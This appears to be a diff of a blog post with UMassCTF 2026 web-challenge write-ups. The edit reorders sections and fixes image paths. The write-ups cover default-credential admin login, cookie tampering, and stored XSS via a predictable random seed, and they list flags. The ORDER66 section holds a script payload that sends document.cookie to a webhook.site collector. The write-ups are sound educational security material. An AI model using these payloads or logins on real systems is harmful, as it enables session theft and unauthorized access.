@@ -12,172 +12,6 @@ toc: true
 
 Hello everyone, today's writeup will be for UMassCTF 2026 some web challenges, so let's start.
 
-## Brick by Brick
-
-![Brick_by_Brick_](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Brick_by_Brick.png)
-
-The first challenge is black-box style, so let's navigate to the link provided directly.
-
-We can see it's a normal page with no functionalities, so I think to check whether the `robots.txt` exists. 
-
-![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Site_Overview.png)
-
-We can see `robots.txt` looks interesting.
-
-![robots.txt](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/robots.txt.png)
-
-![assembly-guide](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/assembly-guide.png)
-
-
-
-![q3-report](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/q3-report.png)
-
-`it-onboarding.txt` caught my attention as it tells us some things:
-
-1. `?file=` parameter which indicates to local file inclusion (LFI)
-2. `config.php` which may contains sensitive data.
-
-![it-onboarding](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/it-onboarding.png)
-
-We can see `config.php` file is publicly exposed and contains admin dashboard endpoint with database credentials.
-
-![config](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/config.png)
-
-So, let's go to `/dashboard-admin.php` and login with `administrator:administrator`
-
-![Admin_Login](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Admin_Login.png)
-
-And we got the flag.
-
-![Flag](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Flag.png)
-
-> **Flag:** UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}
-
-## BrOWSER BOSS FIGHT
-
-![BrOWSER_BOSS_FIGHT](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/BrOWSER_BOSS_FIGHT.png)
-
-If we go to the challenge website, we can see an input to enter a key and a door we can click.
-
-![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_Overview.png)
-
-When we look at the source code, we observe that whatever the key we type, it will be replaced with `WEAK_NON_KOOPA_KNOCK`. 
-
-![SourceCode](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/SourceCode.png)
-
-So, typing random key and click on the door will redirect us to this page.
-
-![Site_Overview_2](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_Overview_2.png)
-
-If we look at burp suite, we can see interesting `Server` header in response with hint of `under_the_doormate`.
-
-![password](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/password_1.png)
-
-
-
-Let's try it as key.
-
-![password_2](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/password_2.png)
-
-
-
-We can see that we will redirected to another page but no flag appeared.
-
-We can observe that there is a cookie variable called `hasAxe` and its default value is `false`.
-
-![Site_3](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_3.png)
-
-If we add `hasAxe: true` while visiting this endpoint, we will get the flag.
-
-![Flag](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Flag.png)
-
-> **Flag:** UMASS{br0k3n_1n_2_b0wz3r5_c4st13}
-
-## ORDER66
-
-![ORDER66](/assets/images/ctf_writeups/UMass_CTF/ORDER66/ORDER66.png)
-
-`White-Box` Challenge, so let's check the website first to understand what it does dynamically then move to source code.
-
-![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Site_Overview.png)
-
-![checker](/assets/images/ctf_writeups/UMass_CTF/ORDER66/checker.png)
-
-The app contains 66 box and one of them is vulnerable:
-
-![Vulnerable_Code](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Vulnerable_Code.png)
-
-> `|safe` don't escape characters, so there is a chance for XSS and steal cookies.
-
-But we need to find the vulnerable box. How??
-
-`app.py`
-
-```python
-def get_grid_context(uid, seed):
-    random.seed(seed) 
-    v_index = random.randint(1, 66)
-    data = {i: (db.get(f"{uid}:box_{i}") or "") for i in range(1, 67)}
-    return data, v_index
-
-@app.route("/", methods=['GET', 'POST'])
-def hello_world():
-    if 'user_id' not in session:
-        session['user_id'] = str(uuid.uuid4())
-        session['seed'] = random.randint(1000, 9999)
-
-    uid = session['user_id']
-    
-    current_seed = session.get('seed', random.randint(1000, 9999))
-    _, current_vuln_index = get_grid_context(uid, current_seed)
-
-    current_content = db.get(f"{uid}:box_{current_vuln_index}") or ""
-    
-    is_payload_present = "<script" in current_content.lower() or "alert(" in current_content.lower()
-
-    if request.method == 'POST':
-        submitted = [int(k.split('_')[1]) for k in request.form if k.startswith('box_') and request.form[k].strip()]
-        
-        if len(submitted) > 1:
-            return "ERROR: Only ONE box allowed.", 400
-        
-        for i in range(1, 67):
-            content = request.form.get(f'box_{i}')
-            if content and i in submitted:
-                db.set(f"{uid}:box_{i}", content)
-                if i == current_vuln_index and ("<script" in content.lower() or "alert(" in content.lower()):
-                    is_payload_present = True
-            else:
-                db.delete(f"{uid}:box_{i}")
-
-    if not is_payload_present:
-        session['seed'] = random.randint(1000, 9999)
-    else:
-        session['seed'] = current_seed 
-
-    seed = session['seed']
-    grid_data, vuln_index = get_grid_context(uid, seed)
-    
-    return render_template('index.html', vuln_index=vuln_index, grid_data=grid_data, user_id=uid, seed=seed, host=host)
-```
-
-Python's `random` is deterministic. sme seed equals same output, every time. The seed is exposed in the page. So we can extract the vulnerable box locally:
-
-![Vulnerable_Box_Num](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Vulnerable_Box_Num.png)
-
-If our payload is in the wrong box, the vulnerable box moves on every submission. If it's in the right box, the seed and therefore the vulnerable box stays fixed permanently. So, we can send the seed URL to admin and get the flag.
-
-**Payload:** `<script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script>`
-
-Now, let's send the seed URL to admin and get the flag.
-
-![admin_report](/assets/images/ctf_writeups/UMass_CTF/ORDER66/admin_report.png)
-
-![Flag](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Flag.png)
-
-> **Flag:** UMASS{m@7_t53_f0rce_b$_w!th_y8u}
-
-
 ## The Block City Times
 
 ![The_Block_City_Times](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/The_Block_City_Times.png)
@@ -820,9 +654,9 @@ public class TagController {
 
   - It returns articles that have a specific tag.
 
-    ![Tags_2](file:///C:/Users/abdel/Downloads/UMASS_CTF2026/Writeups/The_Block_City_Times/Tags_2.png?lastModify=1776078263)
+    ![Tags_2](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Tags_2.png)
 
-    ![Tags_1](file:///C:/Users/abdel/Downloads/UMASS_CTF2026/Writeups/The_Block_City_Times/Tags_1.png?lastModify=1776078263)
+    ![Tags_1](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Tags_1.png)
 
   - It updates article tags and returns it sanitized. 
 
@@ -934,3 +768,168 @@ The hard work was done. Now, we just read `document.cookie`, extract the FLAG va
 ![Flag](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Flag.png)
 
 > **Flag:** UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}
+
+## Brick by Brick
+
+![Brick_by_Brick_](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Brick_by_Brick.png)
+
+The first challenge is black-box style, so let's navigate to the link provided directly.
+
+We can see it's a normal page with no functionalities, so I think to check whether the `robots.txt` exists. 
+
+![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Site_Overview.png)
+
+We can see `robots.txt` looks interesting.
+
+![robots.txt](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/robots.txt.png)
+
+![assembly-guide](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/assembly-guide.png)
+
+
+
+![q3-report](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/q3-report.png)
+
+`it-onboarding.txt` caught my attention as it tells us some things:
+
+1. `?file=` parameter which indicates to local file inclusion (LFI)
+2. `config.php` which may contains sensitive data.
+
+![it-onboarding](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/it-onboarding.png)
+
+We can see `config.php` file is publicly exposed and contains admin dashboard endpoint with database credentials.
+
+![config](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/config.png)
+
+So, let's go to `/dashboard-admin.php` and login with `administrator:administrator`
+
+![Admin_Login](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Admin_Login.png)
+
+And we got the flag.
+
+![Flag](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Flag.png)
+
+> **Flag:** UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}
+
+## BrOWSER BOSS FIGHT
+
+![BrOWSER_BOSS_FIGHT](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/BrOWSER_BOSS_FIGHT.png)
+
+If we go to the challenge website, we can see an input to enter a key and a door we can click.
+
+![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_Overview.png)
+
+When we look at the source code, we observe that whatever the key we type, it will be replaced with `WEAK_NON_KOOPA_KNOCK`. 
+
+![SourceCode](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/SourceCode.png)
+
+So, typing random key and click on the door will redirect us to this page.
+
+![Site_Overview_2](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_Overview_2.png)
+
+If we look at burp suite, we can see interesting `Server` header in response with hint of `under_the_doormate`.
+
+![password](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/password_1.png)
+
+
+
+Let's try it as key.
+
+![password_2](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/password_2.png)
+
+
+
+We can see that we will redirected to another page but no flag appeared.
+
+We can observe that there is a cookie variable called `hasAxe` and its default value is `false`.
+
+![Site_3](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_3.png)
+
+If we add `hasAxe: true` while visiting this endpoint, we will get the flag.
+
+![Flag](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Flag.png)
+
+> **Flag:** UMASS{br0k3n_1n_2_b0wz3r5_c4st13}
+
+## ORDER66
+
+![ORDER66](/assets/images/ctf_writeups/UMass_CTF/ORDER66/ORDER66.png)
+
+`White-Box` Challenge, so let's check the website first to understand what it does dynamically then move to source code.
+
+![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Site_Overview.png)
+
+![checker](/assets/images/ctf_writeups/UMass_CTF/ORDER66/checker.png)
+
+The app contains 66 box and one of them is vulnerable:
+
+![Vulnerable_Code](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Vulnerable_Code.png)
+
+> `|safe` don't escape characters, so there is a chance for XSS and steal cookies.
+
+But we need to find the vulnerable box. How??
+
+`app.py`
+
+```python
+def get_grid_context(uid, seed):
+    random.seed(seed) 
+    v_index = random.randint(1, 66)
+    data = {i: (db.get(f"{uid}:box_{i}") or "") for i in range(1, 67)}
+    return data, v_index
+
+@app.route("/", methods=['GET', 'POST'])
+def hello_world():
+    if 'user_id' not in session:
+        session['user_id'] = str(uuid.uuid4())
+        session['seed'] = random.randint(1000, 9999)
+
+    uid = session['user_id']
+    
+    current_seed = session.get('seed', random.randint(1000, 9999))
+    _, current_vuln_index = get_grid_context(uid, current_seed)
+
+    current_content = db.get(f"{uid}:box_{current_vuln_index}") or ""
+    
+    is_payload_present = "<script" in current_content.lower() or "alert(" in current_content.lower()
+
+    if request.method == 'POST':
+        submitted = [int(k.split('_')[1]) for k in request.form if k.startswith('box_') and request.form[k].strip()]
+        
+        if len(submitted) > 1:
+            return "ERROR: Only ONE box allowed.", 400
+        
+        for i in range(1, 67):
+            content = request.form.get(f'box_{i}')
+            if content and i in submitted:
+                db.set(f"{uid}:box_{i}", content)
+                if i == current_vuln_index and ("<script" in content.lower() or "alert(" in content.lower()):
+                    is_payload_present = True
+            else:
+                db.delete(f"{uid}:box_{i}")
+
+    if not is_payload_present:
+        session['seed'] = random.randint(1000, 9999)
+    else:
+        session['seed'] = current_seed 
+
+    seed = session['seed']
+    grid_data, vuln_index = get_grid_context(uid, seed)
+    
+    return render_template('index.html', vuln_index=vuln_index, grid_data=grid_data, user_id=uid, seed=seed, host=host)
+```
+
+Python's `random` is deterministic. sme seed equals same output, every time. The seed is exposed in the page. So we can extract the vulnerable box locally:
+
+![Vulnerable_Box_Num](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Vulnerable_Box_Num.png)
+
+If our payload is in the wrong box, the vulnerable box moves on every submission. If it's in the right box, the seed and therefore the vulnerable box stays fixed permanently. So, we can send the seed URL to admin and get the flag.
+
+**Payload:** `<script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script>`
+
+Now, let's send the seed URL to admin and get the flag.
+
+![admin_report](/assets/images/ctf_writeups/UMass_CTF/ORDER66/admin_report.png)
+
+![Flag](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Flag.png)
+
+> **Flag:** UMASS{m@7_t53_f0rce_b$_w!th_y8u}
